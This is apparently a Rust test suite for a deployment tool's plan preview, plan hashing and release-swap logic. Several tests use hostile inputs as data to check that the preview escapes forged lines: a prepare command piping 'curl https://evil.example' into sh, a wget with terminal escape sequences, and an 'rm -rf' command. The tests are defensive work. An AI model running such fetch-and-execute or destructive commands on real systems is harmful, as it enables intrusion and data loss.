    // The golden names a reference where the render shows one, and where the `target:`
    // line prints the JSON it is declared as.
    let golden = GOLDEN_DRY_RUN
        .replace("<shown DEPLOY_HOST>", &shown("DEPLOY_HOST"))
        .replace(
            "<declared DEPLOY_HOST>",
            &serde_json::to_string(&Text::reference("DEPLOY_HOST")).unwrap(),
        )
        .replace("<shown DEPLOY_DOMAIN>", &shown("DEPLOY_DOMAIN"));
    assert_eq!(render_deploy(&report), golden);
}

/// Two plans that differ only in a `prepare` command — in the script, not in any
/// step's name — render differently: the preview is a review of what the hash
/// covers, not a list of step names.
#[test]
fn plans_that_hash_apart_render_apart() {
    let render = |prepare: &str| {
        let deploy: DeploySpec = serde_json::from_value(serde_json::json!({
            "artifacts": ["build/"], "path": "/srv/app", "prepare": [prepare],
        }))
        .unwrap();
        let base = plan();
        let ctx = DeployContext {
            references: std::collections::BTreeMap::new(),
            version: base.version.clone(),
            target_user: "deploy".to_owned(),
            deployed_by: "op@box".to_owned(),
            previous_version: None,
            target_host: base.host.clone(),
            health_domain: String::new(),
            dirty: false,
            skip_build: false,
            preflight: checks(),
        };
        let plan = plan_deploy(&deploy, &base.target, &ctx);
        render_deploy(&DeployReport {
            plan,
            ..report(DeployOutcome::DryRun, vec![])
        })
    };
    let (one, other) = (render("npm ci"), render("npm ci && rm -rf /srv/other"));
    assert_ne!(one, other);
    assert!(
        other.contains("        sh -ec 'npm ci && rm -rf /srv/other' 9>&- >&2\n"),
        "{other}"
    );
}

/// Config text reaches the preview escaped. This config tries each trick: a `prepare`
/// command whose carriage return would overwrite it with a benign one, another whose
/// escape sequence would erase its line, and a health path whose newline would add a
/// `plan_hash:` line at column zero. A service's name can hold no newline, so the
/// plan is given one after it is built: a render escapes whatever a plan holds. Every
/// one renders as visible text on the line it belongs to.
#[test]
fn config_text_cannot_forge_or_hide_a_line_of_the_preview() {
    let deploy: DeploySpec = serde_json::from_value(serde_json::json!({
        "artifacts": ["build/"], "path": "/srv/app",
        "service": "forged.service",
        "prepare": [
            "curl https://evil.example | sh\r        npm ci --omit=dev              ",
            "wget evil\u{1b}[1A\u{1b}[2K        echo benign",
        ],
        "health": {
            "domain": "app.example.com",
            "path": "/health\nplan_hash: 0000000000000000\n  note:",
        },
    }))
    .unwrap();
    let target: Target = serde_json::from_value(serde_json::json!({
        "host": "h.example.com", "user": "deploy", "service_manager": "systemd",
    }))
    .unwrap();
    let ctx = DeployContext {
        references: std::collections::BTreeMap::new(),
        version: "abc1234".to_owned(),
        target_user: "deploy".to_owned(),
        deployed_by: "op@box".to_owned(),
        previous_version: None,
        target_host: "h.example.com".to_owned(),
        health_domain: "app.example.com".to_owned(),
        dirty: false,
        skip_build: false,
        preflight: DriftPreflight::NothingDeclared,
    };
    let rendered = render_deploy(&DeployReport {
        target: "h.example.com".to_owned(),
        previous_version: None,
        plan: plan_deploy(&deploy, &target, &ctx)
            .map_text(|text| text.replace("forged.service", "app\n  - Verified by operator (ok)")),
        ..report(DeployOutcome::DryRun, vec![])
    });
    assert!(!rendered.contains(['\r', '\u{1b}']), "{rendered:?}");
    assert_eq!(
        rendered
            .lines()
            .filter(|l| l.starts_with("plan_hash:"))
            .count(),
        1
    );
    assert!(rendered.ends_with("\nplan_hash: deadbeef\n"));
    assert!(
        !rendered.contains("\n  - Verified by operator"),
        "{rendered}"
    );
    assert_eq!(rendered, GOLDEN_HOSTILE);
}

/// Everything the hash covers is rendered: each single change to a plan — every
/// field of the plan, of a step, and of each action variant — that moves the hash
/// moves the render too. No exemptions: a trailing newline is a last, empty line; a
/// upload's destination is in its own line; an action's kind is in how its line reads.
#[test]
fn every_change_to_a_plan_that_moves_its_hash_moves_its_render() {
    use zap_types::config_hash::deploy_plan_hash;
    type Mutation = (&'static str, Box<dyn Fn(&mut DeployPlan)>);
    fn step(plan: &mut DeployPlan, id: DeployStepId) -> &mut DeployStep {
        plan.steps.iter_mut().find(|s| s.id == id).unwrap()
    }
    macro_rules! field {
        ($name:literal, $id:ident, $variant:ident { $field:ident }, $change:expr) => {
            (
                $name,
                Box::new(|p: &mut DeployPlan| {
                    let DeployAction::$variant { $field, .. } =
                        &mut step(p, DeployStepId::$id).action
                    else {
                        panic!("{} is not a {}", $name, stringify!($variant));
                    };
                    $change($field);
                }),
            )
        };
    }
    fn push(text: &mut String) {
        text.push('x');
    }
    fn newline(text: &mut String) {
        text.push('\n');
    }
    fn crlf(text: &mut String) {
        *text = text.replace('\n', "\r\n");
    }
    fn count(n: &mut u32) {
        *n += 1;
    }
    fn millis(n: &mut u64) {
        *n += 1;
    }

    // Every step kind: the preview plan's, plus a build and a restart.
    let mut base = preview_plan();
    let full = plan();
    base.steps.insert(0, full.steps[0].clone());
    base.steps.push(full.steps.last().unwrap().clone());
    let render = |plan: &DeployPlan| {
        render_deploy(&DeployReport {
            plan: plan.clone(),
            ..report(DeployOutcome::DryRun, vec![])
        })
    };

    let mutations: Vec<Mutation> = vec![
        ("plan.version", Box::new(|p| p.version.push('x'))),
        (
            "plan.target",
            Box::new(|p| {
                p.target = serde_json::from_value(serde_json::json!({
                    "host": Text::reference("DEPLOY_HOST"), "user": "deploy", "port": 2223,
                }))
                .unwrap();
            }),
        ),
        ("plan.host", Box::new(|p| p.host.push('x'))),
        ("plan.dirty", Box::new(|p| p.dirty = !p.dirty)),
        (
            "plan.preflight (checks)",
            Box::new(|p| p.preflight = checks()),
        ),
        (
            "plan.preflight (nothing declared)",
            Box::new(|p| p.preflight = DriftPreflight::NothingDeclared),
        ),
        (
            "plan.warnings",
            Box::new(|p| p.warnings.push("w".to_owned())),
        ),
        (
            "plan.steps (one removed)",
            Box::new(|p| drop(p.steps.pop())),
        ),
        ("plan.steps (reordered)", Box::new(|p| p.steps.swap(0, 1))),
        (
            "step.id",
            Box::new(|p| step(p, DeployStepId::Health).id = DeployStepId::Rollback),
        ),
        (
            "step.name",
            Box::new(|p| step(p, DeployStepId::Upload).name.push('x')),
        ),
        field!("build.command", Build, Build { command }, push),
        field!(
            "build.command + a trailing newline",
            Build,
            Build { command },
            newline
        ),
        field!(
            "build.command emptied",
            Build,
            Build { command },
            String::clear
        ),
        field!("tarball.command", Tarball, Tarball { command }, push),
        field!("upload.remote", Upload, Upload { remote }, push),
        field!(
            "extract_swap.script",
            ExtractSwap,
            ExtractSwap { script },
            push
        ),
        field!(
            "extract_swap.script + a trailing newline",
            ExtractSwap,
            ExtractSwap { script },
            newline
        ),
        field!(
            "extract_swap.script as CRLF",
            ExtractSwap,
            ExtractSwap { script },
            crlf
        ),
        field!("restart.command", Restart, Restart { command }, push),
        field!("health.url", Health, Health { url }, push),
        field!("health.url_label", Health, Health { url_label }, push),
        field!("health.attempts", Health, Health { attempts }, count),
        field!("health.interval_ms", Health, Health { interval_ms }, millis),
        field!("readiness.url", Readiness, Readiness { url }, push),
        field!(
            "readiness.url_label",
            Readiness,
            Readiness { url_label },
            push
        ),
        field!(
            "readiness.attempts",
            Readiness,
            Readiness { attempts },
            count
        ),
        field!(
            "readiness.interval_ms",
            Readiness,
            Readiness { interval_ms },
            millis
        ),
        (
            "a health action become a readiness action",
            Box::new(|p| {
                let s = step(p, DeployStepId::Health);
                if let DeployAction::Health {
                    url,
                    url_label,
                    attempts,
                    interval_ms,
                } = s.action.clone()
                {
                    s.action = DeployAction::Readiness {
                        url,
                        url_label,
                        attempts,
                        interval_ms,
                    };
                }
            }),
        ),
        (
            "a build action become a restart action",
            Box::new(|p| {
                let s = step(p, DeployStepId::Build);
                if let DeployAction::Build { command } = s.action.clone() {
                    s.action = DeployAction::Restart { command };
                }
            }),
        ),
        (
            "health.url_label made the url",
            Box::new(|p| {
                if let DeployAction::Health { url, url_label, .. } =
                    &mut step(p, DeployStepId::Health).action
                {
                    url_label.clone_from(url);
                }
            }),
        ),
    ];
    let (hash, rendered) = (deploy_plan_hash(&base).unwrap(), render(&base));
    for (name, mutate) in &mutations {
        let mut plan = base.clone();
        mutate(&mut plan);
        assert_ne!(deploy_plan_hash(&plan).unwrap(), hash, "{name}: not hashed");
        assert_ne!(render(&plan), rendered, "{name}: hashed, not rendered");
    }

    // What a checking preflight covers, against another checking preflight.
    let checking = |resources: usize, digest: &str| DeployPlan {
        preflight: DriftPreflight::Checks {
            resources,
            digest: digest.to_owned(),
        },
        ..base.clone()
    };
    let one = checking(1, "d1");
    for (name, other) in [
        ("preflight.resources", checking(2, "d1")),
        ("preflight.digest", checking(1, "d2")),
    ] {
        assert_ne!(
            deploy_plan_hash(&other).unwrap(),
            deploy_plan_hash(&one).unwrap(),
            "{name}: not hashed"
        );
        assert_ne!(render(&other), render(&one), "{name}: hashed, not rendered");
    }
}

/// A report says whether its run emitted events: only a wetrun that reached its
/// steps did.
#[test]
fn only_a_wetrun_that_reached_its_steps_streamed() {
    for (outcome, streamed) in [
        (DeployOutcome::Deployed, true),
        (DeployOutcome::Failed, true),
        (DeployOutcome::AlreadyDeployed, false),
        (refused("stale"), false),
        (
            DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
            false,
        ),
        (DeployOutcome::PreflightDrift, false),
        (DeployOutcome::PreflightUndetermined, false),
    ] {
        let report = report(outcome.clone(), vec![]);
        assert!(report.wetrun);
        assert_eq!(report.streamed(), streamed, "{outcome:?}");
    }
    assert!(!report(DeployOutcome::DryRun, vec![]).streamed());
}

/// The `plan_hash` is printed with the steps it stands for and never without them:
/// a hash for a plan the render didn't show is one `--expect-plan` could name
/// unreviewed. A wetrun that stopped before its steps still reads as a wetrun.
#[test]
fn the_plan_hash_is_rendered_only_with_the_steps() {
    let completed = vec![StepOutcome::Completed {
        step: "build".to_owned(),
        output: String::new(),
    }];
    // (outcome, its step outcomes, steps shown, hash printed, recorded as a preview)
    for (outcome, outcomes, steps, hash, recorded) in [
        (DeployOutcome::DryRun, vec![], true, true, true),
        (refused("stale"), vec![], true, true, true),
        (
            DeployOutcome::Deployed,
            completed.clone(),
            true,
            true,
            false,
        ),
        (DeployOutcome::Failed, completed, true, true, false),
        // A plan that names no one machine is shown, with no handle on it.
        (unbindable(), vec![], true, false, false),
        (DeployOutcome::AlreadyDeployed, vec![], false, false, false),
        (DeployOutcome::PreflightDrift, vec![], false, false, false),
        (
            DeployOutcome::PreflightUndetermined,
            vec![],
            false,
            false,
            false,
        ),
    ] {
        let rendered = render_deploy(&report(outcome.clone(), outcomes));
        assert_eq!(
            rendered.lines().any(|line| line.starts_with("plan_hash:")),
            hash,
            "{outcome:?}: {rendered}"
        );
        assert_eq!(
            rendered.contains("(build)") || rendered.contains("ok    build"),
            steps,
            "{outcome:?}: {rendered}"
        );
        assert_eq!(outcome.shows_hash(), hash, "{outcome:?}");
        assert_eq!(outcome.preview_pass().is_some(), recorded, "{outcome:?}");
        // Recorded only if printed, printed only if shown.
        assert!(!recorded || hash, "{outcome:?}");
        assert!(!hash || steps, "{outcome:?}");
    }
    let bailed = render_deploy(&report(DeployOutcome::PreflightDrift, vec![]));
    assert!(
        bailed.starts_with("deploy — target host.example (wetrun)\n"),
        "{bailed}"
    );
}

#[test]
fn dry_run_render_lists_the_steps() {
    let rendered = render_deploy(&report(DeployOutcome::DryRun, vec![]));
    assert!(rendered.contains("(dry-run"));
    assert!(rendered.contains("(dry-run — re-run with --wetrun to deploy)"));
    assert!(rendered.contains("Build application (build)"));
    assert!(rendered.contains("Extract and swap release (extract_swap)"));
    assert!(rendered.contains("version: abc1234 (previous: def5678)"));
}

#[test]
fn wetrun_render_shows_outcomes() {
    let outcomes = vec![
        StepOutcome::Completed {
            step: "build".to_owned(),
            output: String::new(),
        },
        StepOutcome::Failed {
            step: "upload".to_owned(),
            error: "the put refused".to_owned(),
        },
        StepOutcome::Skipped {
            step: "extract_swap".to_owned(),
            reason: "aborted after `upload` failed".to_owned(),
        },
    ];
    let rendered = render_deploy(&report(DeployOutcome::Failed, outcomes));
    assert!(rendered.contains("ok    build"));
    assert!(rendered.contains("FAIL  upload  — the put refused"));
    assert!(rendered.contains("skip  extract_swap"));
}

/// A step that declines to run reports `Skipped`, not `Completed`: a readiness gate
/// the target doesn't serve (a `404` from a loopback listener) is a step that never
/// checked anything, and a machine consumer of the event stream must not read it as
/// a gate that passed. The warning says the release shipped without it.
#[tokio::test]
async fn a_step_that_declines_to_run_is_skipped_not_completed() {
    use std::io::{Read as _, Write as _};

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}/ready", listener.local_addr().unwrap());
    std::thread::spawn(move || {
        for mut sock in listener.incoming().flatten() {
            let mut buf = [0u8; 1024];
            let _ = sock.read(&mut buf);
            let _ = sock.write_all(
                b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
            );
        }
    });
    let plan = DeployPlan {
        steps: vec![DeployStep {
            id: DeployStepId::Readiness,
            name: "Readiness check".to_owned(),
            action: DeployAction::Readiness {
                url_label: url.clone(),
                url,
                attempts: 1,
                interval_ms: 0,
            },
        }],
        ..plan()
    };
    let local = Connection::Mock(MockConnection::new("local"));
    let target = Connection::Mock(MockConnection::new("host"));
    let mut warnings = Vec::new();
    let scratch = tempfile::tempdir().unwrap();
    let outcomes = execute_deploy_plan(
        &local,
        &target,
        super::AppLive {
            app: "/root/app",
            previous: None,
        },
        &plan,
        ReleaseArchive::under(scratch.path()),
        &EventHandler::Null,
        &mut warnings,
    )
    .await;
    let [StepOutcome::Skipped { step, reason }] = outcomes.as_slice() else {
        panic!("an unserved readiness gate must not report as completed: {outcomes:?}");
    };
    assert_eq!(step, "readiness");
    assert!(reason.contains("absent (404)"), "{reason}");
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("readiness gate SKIPPED")),
        "{warnings:?}"
    );
}

/// What the extract-and-swap script marks as a warning on its stdout — what it
/// recovered from a deploy that did not finish — reaches the run's warnings without the
/// mark, whether the script then succeeds or fails; nothing else it says does, and a
/// marked line on its stderr — where every `prepare` command's output goes — is no
/// warning.
#[tokio::test]
async fn the_script_marked_warnings_reach_the_run() {
    use zap_types::deploy::SCRIPT_WARNING_PREFIX;

    let succeeded = format!("echo '{SWAPPED_LINE}'; exit 0");
    for (exit, failed) in [(succeeded.as_str(), false), ("exit 1", true)] {
        let dir = tempfile::tempdir().unwrap();
        let scratch = dir.path().join("scratch");
        std::fs::create_dir(&scratch).unwrap();
        let remote = dir.path().join("uploaded.tar.gz");
        let script = format!(
            "cat > /dev/null; printf '%s\\n' 'noise' '{SCRIPT_WARNING_PREFIX}restored releases/v1' \
             'ERROR: zap warning: not at the start' '{SCRIPT_WARNING_PREFIX}removed releases/.zap-stage'; \
             printf '%s\\n' '{SCRIPT_WARNING_PREFIX}printed by a prepare command' >&2; {exit}"
        );
        let plan = archive_plan(
            &format!("printf x > \"${ARCHIVE_ENV}\""),
            &remote.to_string_lossy(),
            &script,
        );
        let mut warnings = Vec::new();
        let outcomes = execute_deploy_plan(
            &Connection::Local,
            &Connection::Local,
            super::AppLive {
                app: "/root/app",
                previous: None,
            },
            &plan,
            ReleaseArchive::under(&scratch),
            &EventHandler::Null,
            &mut warnings,
        )
        .await;
        assert_eq!(
            outcomes.last().is_some_and(StepOutcome::is_failure),
            failed,
            "{outcomes:?}"
        );
        assert_eq!(
            warnings,
            ["restored releases/v1", "removed releases/.zap-stage"],
            "{exit}"
        );
        if let Some(StepOutcome::Completed { output, .. }) = outcomes.last() {
            assert_eq!(output, "noise\nERROR: zap warning: not at the start");
        }
    }
}

/// The three steps of [`archive_plan`] plus a restart that touches `restarted`, walked
/// on this machine with `app` as the app path: the outcomes and the warnings.
async fn walk_swap(
    dir: &Path,
    app: &Path,
    script_tail: &str,
    restarted: &Path,
) -> (Vec<StepOutcome>, Vec<String>) {
    let scratch = dir.join("scratch");
    std::fs::create_dir(&scratch).unwrap();
    let mut plan = archive_plan(
        &format!("printf x > \"${ARCHIVE_ENV}\""),
        &dir.join("uploaded.tar.gz").to_string_lossy(),
        &format!("cat > /dev/null; {script_tail}"),
    );
    plan.steps.push(DeployStep {
        id: DeployStepId::Restart,
        name: "Restart".to_owned(),
        action: DeployAction::Restart {
            command: format!(
                "touch {}",
                zap_types::shell::single_quote(&restarted.to_string_lossy())
            ),
        },
    });
    let mut warnings = Vec::new();
    let outcomes = execute_deploy_plan(
        &Connection::Local,
        &Connection::Local,
        super::AppLive {
            app: &app.to_string_lossy(),
            previous: None,
        },
        &plan,
        ReleaseArchive::under(&scratch),
        &EventHandler::Null,
        &mut warnings,
    )
    .await;
    (outcomes, warnings)
}

/// The executor reads the swap by the script's `SWAPPED_LINE`, not its exit status: a
/// script that swapped and then failed has a live release, which is restarted as usual,
/// its failure a warning; one that exited without the line — however it exited —
/// swapped nothing, so nothing after it runs.
#[tokio::test]
async fn the_swap_is_read_by_its_line_not_the_scripts_exit() {
    for (tail, swapped, warned) in [
        (
            format!("echo '{SWAPPED_LINE}'; echo 'prune: busy' >&2; exit 1"),
            true,
            true,
        ),
        (
            format!("echo '{SWAPPED_LINE}'; echo 'Deployed version v1'"),
            true,
            false,
        ),
        (
            "echo 'Deployed version v1'; exit 0".to_owned(),
            false,
            false,
        ),
        ("echo 'tar: broken' >&2; exit 1".to_owned(), false, false),
    ] {
        let dir = tempfile::tempdir().unwrap();
        // `current` names the plan's release where the script swapped, as its swap
        // leaves it, and the old one where it didn't.
        let app = dir.path().join("app");
        std::fs::create_dir(&app).unwrap();
        let live = if swapped { "abc1234" } else { "def5678" };
        std::os::unix::fs::symlink(app.join(format!("releases/{live}")), app.join("current"))
            .unwrap();
        let restarted = dir.path().join("restarted");
        let (outcomes, warnings) = walk_swap(dir.path(), &app, &tail, &restarted).await;
        let swap = &outcomes[2];
        assert_eq!(
            matches!(swap, StepOutcome::Completed { .. }),
            swapped,
            "{tail}: {outcomes:?}"
        );
        assert_eq!(restarted.exists(), swapped, "{tail}: {outcomes:?}");
        assert_eq!(
            outcomes.iter().any(StepOutcome::is_failure),
            !swapped,
            "{tail}: {outcomes:?}"
        );
        if let StepOutcome::Completed { output, .. } = swap {
            assert!(!output.contains(SWAPPED_LINE), "{output}");
        }
        let failure = warnings
            .iter()
            .find(|warning| warning.contains("failed after it swapped `current`"));
        assert_eq!(failure.is_some(), warned, "{tail}: {warnings:?}");
        if let Some(failure) = failure {
            assert!(failure.contains("prune: busy"), "{failure}");
        }
    }
}

/// A `prepare` command can reach the script's stdout and print the swap line, then
/// fail the script before its swap. A failed script's line is believed only once
/// `current` names the plan's release: still naming the old one, naming nothing, or
/// being no symbolic link at all, the run swapped nothing, and nothing is restarted
/// against the old release.
#[tokio::test]
async fn a_failed_scripts_swap_line_is_checked_against_current() {
    let spoofed = format!("echo '{SWAPPED_LINE}'; echo 'ERROR: deno: cache failed' >&2; exit 1");
    // What `current` is when the script ends: a link to the old release, nothing at
    // all, or a directory.
    for (current, says) in [
        ("old", "`current` names releases/def5678"),
        ("none", "`current` names nothing"),
        ("dir", "`current` is not a symlink"),
    ] {
        let dir = tempfile::tempdir().unwrap();
        let app = dir.path().join("app");
        std::fs::create_dir(&app).unwrap();
        match current {
            "old" => {
                std::os::unix::fs::symlink(app.join("releases/def5678"), app.join("current"))
                    .unwrap();
            }
            "dir" => std::fs::create_dir(app.join("current")).unwrap(),
            _ => {}
        }
        let restarted = dir.path().join("restarted");
        let (outcomes, _) = walk_swap(dir.path(), &app, &spoofed, &restarted).await;
        let StepOutcome::Failed { error, .. } = &outcomes[2] else {
            panic!("{current}: {outcomes:?}");
        };
        assert!(
            error.starts_with(&format!("the script printed the swap line but {says}")),
            "{current}: {error}"
        );
        assert!(error.contains("ERROR: deno: cache failed"), "{error}");
        assert!(!restarted.exists(), "{current}: {outcomes:?}");
        assert!(
            matches!(outcomes[3], StepOutcome::Skipped { .. }),
            "{outcomes:?}"
        );
    }
}

/// The output of a script that ran with `stdout`, `stderr`, and `success`.
fn script_output(stdout: &str, stderr: &str, success: bool) -> CommandOutput {
    CommandOutput {
        success,
        code: i32::from(!success),
        stdout: stdout.to_owned(),
        stderr: stderr.to_owned(),
    }
}

/// The swap line of a failed script stands unconfirmed — believed, with a warning
/// saying so — only where the read again can't settle it: a read that failed in
/// transport, or a `--force` redeploy of the live version, whose `current` named the
/// version before the run as well as after a swap.
#[tokio::test]
async fn a_swap_line_that_cannot_be_checked_is_believed_unconfirmed() {
    let ran = || {
        Ok(script_output(
            &format!("{SWAPPED_LINE}\n"),
            "prune: busy\n",
            false,
        ))
    };
    // No recording for the read: it fails as a transport would.
    let unreachable = Connection::Mock(MockConnection::new("host"));
    let release = super::walk::Release {
        app: "/root/app",
        version: "abc1234",
        previous: Some("def5678"),
    };
    let (_, warning) = super::walk::swap_ran(&unreachable, release, ran())
        .await
        .unwrap();
    let warning = warning.unwrap();
    assert!(
        warning.contains("the swap could not be confirmed"),
        "{warning}"
    );

    let dir = tempfile::tempdir().unwrap();
    let app = dir.path().join("app");
    std::fs::create_dir(&app).unwrap();
    std::os::unix::fs::symlink(app.join("releases/abc1234"), app.join("current")).unwrap();
    let app = app.to_string_lossy().into_owned();
    let same = super::walk::Release {
        app: &app,
        version: "abc1234",
        previous: Some("abc1234"),
    };
    let (_, warning) = super::walk::swap_ran(&Connection::Local, same, ran())
        .await
        .unwrap();
    let warning = warning.unwrap();
    assert!(
        warning.contains("the swap could not be confirmed")
            && warning.contains("already named releases/abc1234 before the run"),
        "{warning}"
    );
    // A fresh version that `current` names is a swap, confirmed.
    let fresh = super::walk::Release {
        previous: Some("def5678"),
        ..same
    };
    let (_, warning) = super::walk::swap_ran(&Connection::Local, fresh, ran())
        .await
        .unwrap();
    let warning = warning.unwrap();
    assert!(
        warning.contains("failed after it swapped `current`"),
        "{warning}"
    );
}

/// A run that exited 0 without its swap line — a `prepare` command's partial write
/// garbled it — swapped, and is taken as swapped once `current` names the plan's
/// version, with a warning saying the line was lost. A failed run without the line
/// swapped nothing even when `current` names the version: another deploy of the same
/// version may have swapped after this one stopped (here, at the deploy lock), and that
/// release is not this run's to restart or roll back.
#[tokio::test]
async fn a_lost_swap_line_is_read_from_current() {
    let dir = tempfile::tempdir().unwrap();
    let app = dir.path().join("app");
    std::fs::create_dir(&app).unwrap();
    std::os::unix::fs::symlink(app.join("releases/abc1234"), app.join("current")).unwrap();
    let app = app.to_string_lossy().into_owned();
    let garbled = "partialzap: current swapped\nDeployed version abc1234\n";
    let refused = "zap error: another deploy is running for this app\n";
    let fresh = super::walk::Release {
        app: &app,
        version: "abc1234",
        previous: Some("def5678"),
    };
    let same = super::walk::Release {
        previous: Some("abc1234"),
        ..fresh
    };
    for release in [fresh, same] {
        let (shown, warning) = super::walk::swap_ran(
            &Connection::Local,
            release,
            Ok(script_output(garbled, "", true)),
        )
        .await
        .unwrap();
        assert!(shown.ends_with("Deployed version abc1234"), "{shown}");
        let warning = warning.unwrap();
        assert!(warning.contains("missing or garbled"), "{warning}");

        for stdout in [garbled, refused] {
            super::walk::swap_ran(
                &Connection::Local,
                release,
                Ok(script_output(stdout, "", false)),
            )
            .await
            .unwrap_err();
        }
    }
}

/// A script that failed before its swap is reported by the error it marked on its
/// stdout, not by its stderr — which holds every `prepare` command's output, an
/// `ERROR:` line of a tool's own among it — and, with no mark, by the last lines of its
/// stderr, where a failed command (an `mv`) says why.
#[tokio::test]
async fn a_failed_script_is_reported_by_its_reason() {
    for (tail, want) in [
        (
            "printf '%s\\n' 'ERROR: a tool said so' 'npm noise' >&2; \
             printf 'ERROR: %s\\n' 'the deploy lock is held' >&2; \
             printf 'zap error: %s\\n' 'the deploy lock is held'; exit 1",
            "ERROR: the deploy lock is held".to_owned(),
        ),
        (
            "seq 1 30 >&2; exit 1",
            format!(
                "…\n{}",
                (21..=30)
                    .map(|n| n.to_string())
                    .collect::<Vec<_>>()
                    .join("\n")
            ),
        ),
    ] {
        let dir = tempfile::tempdir().unwrap();
        let app = dir.path().join("app");
        let restarted = dir.path().join("restarted");
        let (outcomes, _) = walk_swap(dir.path(), &app, tail, &restarted).await;
        let StepOutcome::Failed { error, .. } = &outcomes[2] else {
            panic!("{tail}: {outcomes:?}");
        };
        assert_eq!(error, &want, "{tail}");
    }

    // A `prepare` tool's own `ERROR:` line, then the script's own command failing: the
    // report is what that command said, not the tool's line.
    let dir = tempfile::tempdir().unwrap();
    let app = dir.path().join("app");
    let restarted = dir.path().join("restarted");
    let tail = "echo 'ERROR: x' >&2; seq 1 10 >&2; echo 'mv: cannot move the release' >&2; false";
    let (outcomes, _) = walk_swap(dir.path(), &app, tail, &restarted).await;
    let StepOutcome::Failed { error, .. } = &outcomes[2] else {
        panic!("{outcomes:?}");
    };
    assert!(!error.contains("ERROR: x"), "{error}");
    assert!(error.ends_with("mv: cannot move the release"), "{error}");
}

/// The three archive steps of a plan: a `Tarball` running `tarball`, an `Upload` to
/// `remote`, and an `ExtractSwap` running `script`.
fn archive_plan(tarball: &str, remote: &str, script: &str) -> DeployPlan {
    let step = |id, action| DeployStep {
        id,
        name: format!("{id}"),
        action,
    };
    DeployPlan {
        steps: vec![
            step(
                DeployStepId::Tarball,
                DeployAction::Tarball {
                    command: tarball.to_owned(),
                },
            ),
            step(
                DeployStepId::Upload,
                DeployAction::Upload {
                    remote: remote.to_owned(),
                },
            ),
            step(
                DeployStepId::ExtractSwap,
                DeployAction::ExtractSwap {
                    script: script.to_owned(),
                },
            ),
        ],
        ..plan()
    }
}

/// The names in `dir`.
fn names(dir: &Path) -> Vec<String> {
    std::fs::read_dir(dir)
        .unwrap()
        .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
        .collect()
}

/// The archive steps run for real, both connections this machine: `tar`'s stand-in
/// finds the archive's path in its environment — a `600` file in a `700` directory
/// under the scratch root — the upload installs those bytes at mode `600`, the
/// script reads their SHA-512 as its one line of stdin, and the directory is gone
/// when the walk ends.
#[tokio::test]
async fn the_archive_is_made_privately_uploaded_whole_and_named_to_the_script_by_digest() {
    use std::os::unix::fs::PermissionsExt as _;

    let dir = tempfile::tempdir().unwrap();
    let scratch = dir.path().join("scratch");
    std::fs::create_dir(&scratch).unwrap();
    let at = |name: &str| dir.path().join(name).to_string_lossy().into_owned();
    let quoted = |name: &str| zap_types::shell::single_quote(&at(name));
    let tarball = format!(
        "printf payload > \"${ARCHIVE_ENV}\" && \
         stat -c %a \"${ARCHIVE_ENV}\" \"${{{ARCHIVE_ENV}%/*}}\" > {} && \
         printf %s \"${ARCHIVE_ENV}\" > {}",
        quoted("modes"),
        quoted("where"),
    );
    let script = format!(
        "IFS= read -r digest || exit 9; printf %s \"$digest\" > {}; cat > {}; echo '{SWAPPED_LINE}'",
        quoted("digest"),
        quoted("rest"),
    );
    let plan = archive_plan(&tarball, &at("uploaded.tar.gz"), &script);
    let mut warnings = Vec::new();
    let outcomes = execute_deploy_plan(
        &Connection::Local,
        &Connection::Local,
        super::AppLive {
            app: "/root/app",
            previous: None,
        },
        &plan,
        ReleaseArchive::under(&scratch),
        &EventHandler::Null,
        &mut warnings,
    )
    .await;
    assert!(
        outcomes
            .iter()
            .all(|outcome| matches!(outcome, StepOutcome::Completed { .. })),
        "{outcomes:?}"
    );
    assert_eq!(
        std::fs::read_to_string(at("modes")).unwrap(),
        "600\n700\n",
        "the archive, then its directory"
    );
    let archive = std::path::PathBuf::from(std::fs::read_to_string(at("where")).unwrap());
    assert!(archive.starts_with(&scratch), "{archive:?}");
    assert_eq!(
        names(&scratch),
        Vec::<String>::new(),
        "removed with the walk"
    );

    let uploaded = std::path::PathBuf::from(at("uploaded.tar.gz"));
    assert_eq!(std::fs::read(&uploaded).unwrap(), b"payload");
    assert_eq!(
        std::fs::metadata(&uploaded).unwrap().permissions().mode() & 0o7777,
        0o600
    );
    assert_eq!(
        std::fs::read_to_string(at("digest")).unwrap(),
        crate::digest::sha512_hex(b"payload")
    );
    assert_eq!(
        std::fs::read(at("rest")).unwrap(),
        b"",
        "the digest line is all"
    );
}

/// The archive steps over a mock target: the upload is one put as the connecting
/// user, the script is issued as planned, and no command holds the archive's digest.
/// A failed upload stops the walk; a failed script is followed by a best-effort
/// removal of the uploaded archive; and the operator's directory is gone each time.
#[tokio::test]
async fn a_failed_archive_step_leaves_no_archive_behind() {
    let dir = tempfile::tempdir().unwrap();
    let tarball = format!("printf payload > \"${ARCHIVE_ENV}\"");
    let remote = "/srv/app/.zap-deploy-deploy-abc1234.tar.gz";
    let plan = archive_plan(&tarball, remote, "the script");
    let failed = |stderr: &str| CommandOutput {
        success: false,
        code: 1,
        stdout: String::new(),
        stderr: stderr.to_owned(),
    };
    let walk = |target: MockConnection, scratch: std::path::PathBuf| {
        let plan = plan.clone();
        async move {
            std::fs::create_dir(&scratch).unwrap();
            let target = Connection::Mock(target);
            let mut warnings = Vec::new();
            let outcomes = execute_deploy_plan(
                &Connection::Local,
                &target,
                super::AppLive {
                    app: "/root/app",
                    previous: None,
                },
                &plan,
                ReleaseArchive::under(&scratch),
                &EventHandler::Null,
                &mut warnings,
            )
            .await;
            assert_eq!(names(&scratch), Vec::<String>::new());
            let Connection::Mock(target) = target else {
                unreachable!()
            };
            (outcomes, target.issued_commands())
        }
    };
    let cleanup = format!("rm -f -- '{remote}'");

    let (outcomes, issued) = walk(
        MockConnection::new("host")
            .with(upload_put(remote), ok(""))
            .with("the script", ok(&format!("{SWAPPED_LINE}\nDeployed\n"))),
        dir.path().join("ok"),
    )
    .await;
    assert!(
        outcomes
            .iter()
            .all(|outcome| matches!(outcome, StepOutcome::Completed { .. })),
        "{outcomes:?}"
    );
    assert_eq!(issued, [upload_put(remote), "the script".to_owned()]);
    assert!(issued[0].starts_with("sh -c '"), "no sudo: {}", issued[0]);
    let digest = crate::digest::sha512_hex(b"payload");
    assert!(!issued.iter().any(|command| command.contains(&digest)));

